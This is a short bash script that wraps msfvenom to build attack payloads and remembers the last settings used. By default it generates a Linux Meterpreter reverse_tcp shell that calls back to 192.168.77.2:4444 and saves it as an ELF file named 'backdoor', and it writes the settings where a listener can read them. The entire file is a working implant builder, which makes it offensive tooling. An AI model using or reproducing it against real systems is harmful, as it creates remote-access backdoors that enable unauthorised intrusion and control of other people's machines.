#!/usr/bin/env bash
# Build any msfvenom payload remembering what you used last time.
# Writes the choices to a shared file so the handler can match them.

state="$HOME/.msf4/last.conf"

# Defaults, overwritten by whatever was saved last run.
payload="linux/x64/meterpreter/reverse_tcp"
lhost="192.168.77.2"
lport="4444"
format="elf"
[ -f "$state" ] && . "$state"

# Enter keeps the bracketed value; type to change it.
read -rp "Payload [$payload]: " in; payload=${in:-$payload}
read -rp "LHOST [$lhost]: " in; lhost=${in:-$lhost}
read -rp "LPORT [$lport]: " in; lport=${in:-$lport}
read -rp "Format [$format]: " in; format=${in:-$format}
read -rp "Output file [backdoor]: " in; out=${in:-backdoor}

# Save for next time and for the handler to read.
mkdir -p "$(dirname "$state")"
printf 'payload=%s\nlhost=%s\nlport=%s\nformat=%s\n' "$payload" "$lhost" "$lport" "$format" > "$state"

msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$out"
echo "Built $out -> $payload $lhost:$lport"
